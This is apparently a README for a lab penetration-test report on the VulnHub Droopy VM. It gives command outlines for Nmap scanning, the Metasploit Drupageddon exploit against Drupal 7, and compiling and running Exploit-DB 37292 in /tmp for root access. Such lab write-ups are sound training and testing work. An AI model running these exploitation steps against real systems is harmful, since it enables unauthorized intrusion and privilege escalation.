# VulnHub Droopy: v0.2 — VAPT Report

## Target
- **Victim IP:** `192.168.31.174`
- **Victim hostname:** `droopy.lan`
- **Observed web stack:** Apache httpd `2.4.7 (Ubuntu)` and Drupal 7
- **Primary evidence:** five supplied screenshots and `report1(10).xlsx`

## Deliverables
- `VulnHub_Droopy_v0.2_VAPT_Report.pdf` — report with PoC tables and embedded evidence screenshots.
- `README.md` — this summary.

## Findings supported by screenshots

### 1. TCP/80 — HTTP / Drupal 7
Nmap output shows TCP/80 open and reports Apache httpd 2.4.7 (Ubuntu), with a Drupal 7 generator banner. The Metasploit screenshot shows `exploit/multi/http/drupal_drupageddon` configured for the victim and a Meterpreter session opening. This supports a successful Drupal remote-code-execution workflow in the isolated lab.

**PoC outline**
```text
nmap -n -sV -sC -O 192.168.31.174
msfconsole
search drupal drupageddon
use exploit/multi/http/drupal_drupageddon
set RHOSTS 192.168.31.174
set RPORT 80
set TARGETURI /
show options
# Configure a suitable payload/listener for the isolated lab.
run
```

### 2. Local privilege escalation — root access
The evidence shows `37292.c` uploaded to `/tmp`, compiled, and executed. The terminal output reports `uid=0(root)`. Exploit-DB 37292 is commonly associated with Dirty COW / CVE-2016-5195, but the screenshot does not show the source code or kernel version, so that specific CVE attribution is **not independently verified**.

**PoC outline from the evidence**
```text
# In the authorized lab target after the initial shell:
cd /tmp
gcc 37292.c -o shell
./shell
id
```
The supplied screenshot shows the resulting identity as root. Run local privilege-escalation code only in a disposable lab VM that you own or are authorized to test.

### 3. robots.txt information disclosure
The screenshot of `/robots.txt` lists Drupal paths and installation-related filenames. `robots.txt` is not an access-control mechanism; verify that sensitive paths are not publicly accessible.

## Port table
| Port | Evidence | Status |
|---|---|---|
| `80/tcp` | Nmap reports Apache 2.4.7 on Ubuntu and Drupal 7 | Verified open |
| `21/tcp` | Workbook lists FTP / vsftpd 2.3.4, but the supplied Nmap screenshot does not show it open | **Not verified; not reported as open** |
| Other TCP ports | Nmap screenshot states 999 closed TCP ports in the top-1,000 scan | No other open ports shown |

## Redaction and limitations
- The victim IP and hostname are preserved.
- Other discovered hostnames/IPs and the attacker/listener IP in the exploit screenshot are redacted.
- No personal email address or personal password is included.
- The report is based on the supplied evidence only; no live validation was performed.

